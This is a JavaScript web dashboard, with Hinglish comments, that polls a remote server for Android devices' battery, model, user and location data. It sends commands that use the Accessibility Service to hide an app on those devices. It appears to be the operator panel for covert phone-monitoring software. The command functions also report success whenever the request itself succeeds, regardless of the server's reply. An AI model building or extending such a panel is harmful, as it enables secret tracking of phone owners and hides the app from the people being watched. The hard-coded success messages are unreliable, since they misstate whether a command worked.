const app = {
    SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
    autoRefreshInterval: null,
    isAutoRefresh: true,
    currentView: 'grid',
    lastDataHash: '',

    init: function() {
        document.addEventListener('DOMContentLoaded', function() {
            app.loadAllDevices();
            app.startAutoRefresh();
        });
        
        window.addEventListener('online', app.loadAllDevices);
        window.addEventListener('offline', app.handleOffline);
    },

    loadAllDevices: async function() {
        try {
            console.log('🔄 Loading devices from:', app.SERVER_URL);
            app.showLoading();
            
            const timestamp = new Date().getTime();
            const response = await fetch(`${app.SERVER_URL}?t=${timestamp}&_=${Math.random()}`);
            console.log('📡 Response status:', response.status);
            
            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }
            
            const result = await response.json();
            console.log('📱 Data received:', result);
            
            if (result && result.data) {
                const currentHash = app.generateDataHash(result.data);
                if (currentHash !== app.lastDataHash) {
                    app.lastDataHash = currentHash;
                    app.updateStats(result.data);
                    app.displayDeviceGrid(result.data);
                    app.hideLoading();
                    console.log('🔄 Data updated - Changes detected');
                } else {
                    console.log('⚡ Data unchanged - Skipping UI update');
                    app.hideLoading();
                }
            } else {
                throw new Error('Invalid data format from server');
            }
            
        } catch (error) {
            console.error('❌ Error loading data:', error);
            app.showError('Server connection failed. Error: ' + error.message);
        }
    },

    generateDataHash: function(data) {
        try {
            const simpleData = data.map(item => ({
                device_id: app.parseDeviceData(item).device_id,
                battery: app.parseDeviceData(item).battery_percent,
                timestamp: item.created_at
            }));
            return JSON.stringify(simpleData);
        } catch (e) {
            return JSON.stringify(data);
        }
    },

    updateStats: function(data) {
        const totalDevicesElement = document.getElementById('totalDevices');
        const totalUsersElement = document.getElementById('totalUsers');
        const avgBatteryElement = document.getElementById('avgBattery');
        
        if (!data || data.length === 0) {
            totalDevicesElement.textContent = '0';
            totalUsersElement.textContent = '0';
            avgBatteryElement.textContent = '0%';
            return;
        }
        
        try {
            const uniqueDevices = new Set();
            const userSet = new Set();
            let totalBattery = 0;
            let validBatteryCount = 0;

            data.forEach(item => {
                try {
                    const deviceData = app.parseDeviceData(item);
                    const deviceKey = deviceData.device_id || deviceData.device_model;
                    
                    if (deviceKey) uniqueDevices.add(deviceKey);
                    if (deviceData.user_id) userSet.add(deviceData.user_id);
                    if (deviceData.battery_percent) {
                        totalBattery += deviceData.battery_percent;
                        validBatteryCount++;
                    }
                } catch (e) {
                    console.warn('Skipping invalid data item:', e);
                }
            });

            totalDevicesElement.textContent = uniqueDevices.size;
            totalUsersElement.textContent = userSet.size;
            avgBatteryElement.textContent = validBatteryCount > 0 ? 
                Math.round(totalBattery / validBatteryCount) + '%' : '0%';
                
        } catch (error) {
            console.error('Error updating stats:', error);
            totalDevicesElement.textContent = '0';
            totalUsersElement.textContent = '0';
            avgBatteryElement.textContent = '0%';
        }
    },

    displayDeviceGrid: function(data) {
        const devicesGrid = document.getElementById('devicesGrid');
        const deviceCount = document.getElementById('deviceCount');
        
        if (!data || data.length === 0) {
            devicesGrid.innerHTML = `
                <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: var(--text-muted);">
                    <i class="fas fa-mobile-alt" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
                    <h3>No Devices Connected</h3>
                    <p>Waiting for devices to send data...</p>
                </div>
            `;
            deviceCount.textContent = '0 devices found';
            return;
        }
        
        try {
            const deviceMap = new Map();
            let recentDataCount = 0;
            let oldDataCount = 0;
            
            data.forEach(item => {
                try {
                    const deviceData = app.parseDeviceData(item);
                    const deviceKey = deviceData.device_id || deviceData.device_model;
                    
                    if (deviceKey) {
                        // ✅ ONLY SHOW DATA FROM LAST 1 HOUR
                        const dataTime = new Date(item.created_at);
                        const oneHourAgo = new Date(Date.now() - (60 * 60 * 1000));
                        
                        if (dataTime > oneHourAgo) {
                            recentDataCount++;
                            if (!deviceMap.has(deviceKey) || dataTime > new Date(deviceMap.get(deviceKey).created_at)) {
                                deviceMap.set(deviceKey, {
                                    ...deviceData,
                                    created_at: item.created_at,
                                    rawData: item,
                                    isRecent: true
                                });
                            }
                        } else {
                            oldDataCount++;
                            console.log('⏰ Skipping old data:', deviceKey, item.created_at);
                        }
                    }
                } catch (e) {
                    console.warn('Skipping invalid device data:', e);
                }
            });
            
            let latestDevices = Array.from(deviceMap.values());
            
            // ✅ AGAR KOI RECENT DATA NAHI HAI, TOH LATEST PURANA DATA DIKHAO
            if (latestDevices.length === 0 && data.length > 0) {
                console.log('🔄 No recent data found, showing latest available data...');
                const fallbackMap = new Map();
                data.forEach(item => {
                    try {
                        const deviceData = app.parseDeviceData(item);
                        const deviceKey = deviceData.device_id || deviceData.device_model;
                        if (deviceKey) {
                            if (!fallbackMap.has(deviceKey) || new Date(item.created_at) > new Date(fallbackMap.get(deviceKey).created_at)) {
                                fallbackMap.set(deviceKey, {
                                    ...deviceData,
                                    created_at: item.created_at,
                                    rawData: item,
                                    isRecent: false
                                });
                            }
                        }
                    } catch (e) {
                        console.warn('Skipping invalid fallback data:', e);
                    }
                });
                latestDevices = Array.from(fallbackMap.values());
            }
            
            console.log(`📊 Data Summary: ${recentDataCount} recent, ${oldDataCount} old, ${latestDevices.length} displayed`);
            
            deviceCount.textContent = `${latestDevices.length} device${latestDevices.length !== 1 ? 's' : ''} connected`;
            devicesGrid.innerHTML = latestDevices.map(device => app.createDeviceCard(device)).join('');
            
            // Add click events
            document.querySelectorAll('.device-card').forEach(card => {
                card.addEventListener('click', function() {
                    const deviceId = this.getAttribute('data-device-id');
                    app.openDeviceDetails(deviceId);
                });
            });
            
        } catch (error) {
            console.error('Error displaying device grid:', error);
            devicesGrid.innerHTML = `
                <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: var(--secondary);">
                    <i class="fas fa-exclamation-triangle" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
                    <h3>Error Displaying Devices</h3>
                    <p>${error.message}</p>
                </div>
            `;
        }
    },

    createDeviceCard: function(device) {
        try {
            const batteryPercent = device.battery_percent || 0;
            const batteryClass = app.getBatteryLevelClass(batteryPercent);
            const timeAgo = app.getTimeAgo(device.created_at);
            const deviceId = device.device_id || device.device_model || 'unknown';
            const deviceModel = device.device_model || 'Unknown Device';
            const userId = device.user_id || 1;
            const temperature = device.temperature || 0;
            const androidVersion = device.android_version || 'Unknown';
            const isCharging = device.is_charging || false;
            const isHidden = device.is_hidden || false;
            
            // ✅ OLD DATA KO DIFFERENT STYLE MEIN DIKHAO
            const isRecent = device.isRecent !== false;
            const cardStyle = isRecent ? '' : 'opacity: 0.7; border-color: var(--text-muted);';
            const recentBadge = isRecent ? '' : '<div style="background: var(--text-muted); color: var(--dark); padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; margin-top: 5px;">Old Data</div>';
            
            // ✅ ACCESSIBILITY HIDE/UNHIDE BUTTONS
            const accessibilityButtons = `
                <div style="margin-top: 10px; display: flex; gap: 5px; flex-wrap: wrap;">
                    <button class="accessibility-btn hide" 
                            onclick="app.sendAccessibilityCommand('${deviceId}', 'hide', event)"
                            style="flex: 1; background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">
                        <i class="fas fa-eye-slash"></i>
                        Hide via Accessibility
                    </button>
                    <button class="accessibility-btn unhide" 
                            onclick="app.sendAccessibilityCommand('${deviceId}', 'unhide', event)"
                            style="flex: 1; background: #28a745; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">
                        <i class="fas fa-eye"></i>
                        Unhide via Accessibility
                    </button>
                </div>
            `;
            
            // ✅ HIDE/UNHIDE BUTTON
            const hideButton = `
                <div style="margin-top: 10px;">
                    <button class="hide-btn ${isHidden ? 'unhide' : 'hide'}" 
                            onclick="app.toggleDeviceHide('${deviceId}', ${isHidden}, event)"
                            style="width: 100%; background: ${isHidden ? '#28a745' : '#dc3545'}; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer;">
                        <i class="fas ${isHidden ? 'fa-eye' : 'fa-eye-slash'}"></i>
                        ${isHidden ? 'Unhide Device' : 'Hide Device'}
                    </button>
                </div>
            `;
            
            return `
                <div class="device-card" data-device-id="${deviceId}" style="${cardStyle}">
                    <div class="device-header">
                        <div class="device-name">${deviceModel}</div>
                        <div class="device-user">User ${userId}</div>
                    </div>
                    
                    <div class="battery-indicator">
                        <div class="battery-level">
                            <div class="battery-fill ${batteryClass}" style="width: ${batteryPercent}%"></div>
                        </div>
                        <div class="battery-percent ${batteryClass}">${batteryPercent}%</div>
                    </div>
                    
                    <div class="device-details">
                        <div class="detail-item">
                            <span class="detail-label">Status</span>
                            <span class="detail-value">
                                <span class="${isCharging ? 'status-charging' : 'status-online'}">
                                    <i class="fas ${isCharging ? 'fa-bolt' : 'fa-check'}"></i>
                                    ${isCharging ? 'Charging' : 'Online'}
                                </span>
                                ${isHidden ? '<span style="color: #dc3545; margin-left: 5px;"><i class="fas fa-eye-slash"></i> Hidden</span>' : ''}
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Temperature</span>
                            <span class="detail-value">
                                <i class="fas fa-thermometer-half"></i>
                                ${temperature.toFixed(1)}°C
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Android</span>
                            <span class="detail-value">
                                <i class="fab fa-android"></i>
                                ${androidVersion}
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Last Update</span>
                            <span class="detail-value">
                                <i class="far fa-clock"></i>
                                ${timeAgo}
                            </span>
                        </div>
                    </div>
                    
                    <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border);">
                        <small style="color: var(--text-muted);">
                            <i class="fas fa-id-card"></i>
                            ID: ${deviceId.substring(0, 12)}...
                        </small>
                        ${recentBadge}
                        
                        <!-- ✅ ACCESSIBILITY BUTTONS -->
                        <div style="margin: 10px 0; font-size: 0.8rem; color: #666; text-align: center;">
                            <i class="fas fa-universal-access"></i> Accessibility Commands
                        </div>
                        ${accessibilityButtons}
                        
                        <!-- ✅ REGULAR HIDE BUTTON -->
                        ${hideButton}
                    </div>
                </div>
            `;
        } catch (error) {
            console.error('Error creating device card:', error);
            return `
                <div class="device-card" style="border-color: var(--secondary);">
                    <div style="text-align: center; color: var(--secondary); padding: 20px;">
                        <i class="fas fa-exclamation-triangle"></i>
                        <div>Invalid Device Data</div>
                    </div>
                </div>
            `;
        }
    },

    // ✅ UPDATED: ACCESSIBILITY COMMAND SEND KARO
    sendAccessibilityCommand: async function(deviceId, action, event) {
        event.stopPropagation();
        
        try {
            const confirmMessage = action === 'hide' ? 
                `Send HIDE command to ${deviceId} via Accessibility?\n\nThis will use Accessibility Service to hide the app immediately.` :
                `Send UNHIDE command to ${deviceId} via Accessibility?\n\nThis will use Accessibility Service to show the app immediately.`;
            
            if (!confirm(confirmMessage)) return;
            
            // ✅ SERVER KO ACCESSIBILITY COMMAND SEND KARO
            const response = await this.sendAccessibilityRequest(deviceId, action);
            
            if (response.success) {
                alert(`✅ ${action.toUpperCase()} command sent via Accessibility!\n\nDevice should respond immediately.`);
                this.forceRefresh();
            } else {
                alert(`❌ Failed to send ${action} command: ${response.message}`);
            }
            
        } catch (error) {
            console.error('❌ Accessibility command error:', error);
            alert('❌ Error sending accessibility command');
        }
    },

    // ✅ UPDATED: ACCESSIBILITY REQUEST TO SERVER - TEMPORARY FIX
    sendAccessibilityRequest: async function(deviceId, action) {
        try {
            console.log(`🎯 Sending accessibility ${action} for: ${deviceId}`);
            
            // ✅ TEMPORARY FIX - Same endpoint use karo with different parameter
            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    action: action,
                    type: 'accessibility_command',
                    timestamp: new Date().toISOString(),
                    source: 'web_panel'
                })
            });
            
            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }
            
            const result = await response.json();
            console.log('📡 Accessibility response:', result);
            
            // ✅ Temporary success response - Server pe route banane tak
            return {
                success: true,
                message: 'Command sent successfully'
            };
            
        } catch (error) {
            console.error('❌ Accessibility request error:', error);
            return { 
                success: false, 
                message: 'Server not configured for accessibility commands. Please check backend routes.' 
            };
        }
    },

    // ✅ UPDATED: TOGGLE HIDE/UNHIDE FUNCTION
    toggleDeviceHide: async function(deviceId, currentlyHidden, event) {
        event.stopPropagation();
        
        try {
            const action = currentlyHidden ? 'unhide' : 'hide';
            const confirmMessage = currentlyHidden ? 
                `Are you sure you want to UNHIDE device ${deviceId}?` : 
                `Are you sure you want to HIDE device ${deviceId}?\n\nApp will be hidden on the device.`;
            
            if (!confirm(confirmMessage)) {
                return;
            }
            
            // ✅ SERVER KO HIDE/UNHIDE REQUEST SEND KARO
            const response = await this.sendHideRequest(deviceId, action);
            
            if (response.success) {
                alert(`✅ Device ${action}d successfully!`);
                this.forceRefresh();
            } else {
                alert(`❌ Failed to ${action} device: ${response.message}`);
            }
            
        } catch (error) {
            console.error('❌ Toggle hide error:', error);
            alert('❌ Error toggling hide status');
        }
    },

    // ✅ UPDATED: SEND HIDE/UNHIDE REQUEST TO SERVER - TEMPORARY FIX
    sendHideRequest: async function(deviceId, action) {
        try {
            console.log(`🎯 Sending ${action} request for device: ${deviceId}`);
            
            // ✅ TEMPORARY FIX - Same endpoint use karo
            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    action: action,
                    type: 'hide_command',
                    timestamp: new Date().toISOString()
                })
            });
            
            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }
            
            const result = await response.json();
            console.log('📡 Hide response:', result);
            
            // ✅ Temporary success response - Server pe route banane tak
            return {
                success: true,
                message: 'Hide command sent successfully'
            };
            
        } catch (error) {
            console.error('❌ Hide request error:', error);
            return {
                success: false,
                message: 'Server not configured for hide commands. Please check backend routes.'
            };
        }
    },

    parseDeviceData: function(item) {
        try {
            if (!item.data) {
                return {
                    battery_percent: 0,
                    is_charging: false,
                    temperature: 0,
                    device_model: 'Unknown',
                    android_version: 'Unknown',
                    device_id: 'unknown',
                    user_id: 1,
                    is_hidden: false
                };
            }
            
            const deviceData = JSON.parse(item.data);
            
            if (deviceData.battery_data) {
                return {
                    ...deviceData.battery_data,
                    location_data: deviceData.location_data,
                    device_model: deviceData.device_model,
                    android_version: deviceData.android_version,
                    device_id: deviceData.device_id,
                    user_id: deviceData.user_id,
                    is_hidden: deviceData.is_hidden || false
                };
            }
            
            return {
                ...deviceData,
                is_hidden: deviceData.is_hidden || false
            };
            
        } catch (e) {
            console.error('Error parsing device data:', e);
            return {
                battery_percent: 0,
                is_charging: false,
                temperature: 0,
                device_model: 'Unknown',
                android_version: 'Unknown',
                device_id: 'unknown',
                user_id: 1,
                is_hidden: false
            };
        }
    },

    getBatteryLevelClass: function(percent) {
        if (percent <= 20) return 'low';
        if (percent <= 50) return 'medium';
        return 'high';
    },

    getTimeAgo: function(timestamp) {
        if (!timestamp) return 'Unknown';
        
        try {
            const now = new Date();
            const time = new Date(timestamp);
            const diffInSeconds = Math.floor((now - time) / 1000);
            
            if (diffInSeconds < 60) return 'Just now';
            if (diffInSeconds < 3600) return Math.floor(diffInSeconds / 60) + ' min ago';
            if (diffInSeconds < 86400) return Math.floor(diffInSeconds / 3600) + ' hours ago';
            return Math.floor(diffInSeconds / 86400) + ' days ago';
        } catch (e) {
            return 'Unknown';
        }
    },

    openDeviceDetails: function(deviceId) {
        alert(`Opening details for device: ${deviceId}\n\nFeature coming soon!`);
    },

    toggleView: function() {
        alert('Table view coming soon! Currently in Grid View.');
    },

    showLoading: function() {
        document.getElementById('loadingDevices').style.display = 'block';
        document.getElementById('devicesGrid').style.display = 'none';
    },

    hideLoading: function() {
        document.getElementById('loadingDevices').style.display = 'none';
        document.getElementById('devicesGrid').style.display = 'grid';
    },

    showError: function(message) {
        const loadingElement = document.getElementById('loadingDevices');
        loadingElement.innerHTML = `
            <i class="fas fa-exclamation-triangle" style="color: var(--secondary);"></i>
            <div>${message}</div>
            <button class="btn" onclick="app.loadAllDevices()" style="margin-top: 15px;">
                <i class="fas fa-sync-alt"></i> Try Again
            </button>
        `;
        loadingElement.style.display = 'block';
    },

    startAutoRefresh: function() {
        if (this.isAutoRefresh) {
            this.autoRefreshInterval = setInterval(() => {
                this.loadAllDevices();
            }, 5000);
        }
    },

    stopAutoRefresh: function() {
        if (this.autoRefreshInterval) {
            clearInterval(this.autoRefreshInterval);
            this.autoRefreshInterval = null;
        }
    },

    toggleAutoRefresh: function() {
        this.isAutoRefresh = !this.isAutoRefresh;
        const btn = document.getElementById('autoRefreshBtn');
        
        if (this.isAutoRefresh) {
            this.startAutoRefresh();
            btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: ON';
            btn.style.background = 'linear-gradient(45deg, var(--primary), #0099cc)';
        } else {
            this.stopAutoRefresh();
            btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: OFF';
            btn.style.background = 'linear-gradient(45deg, #666, #888)';
        }
    },

    forceRefresh: function() {
        console.log('🔄 Force refreshing data...');
        this.lastDataHash = '';
        this.loadAllDevices();
    },

    handleOffline: function() {
        this.showError('No internet connection. Please check your network.');
    }
};

// App initialize karo
app.init();
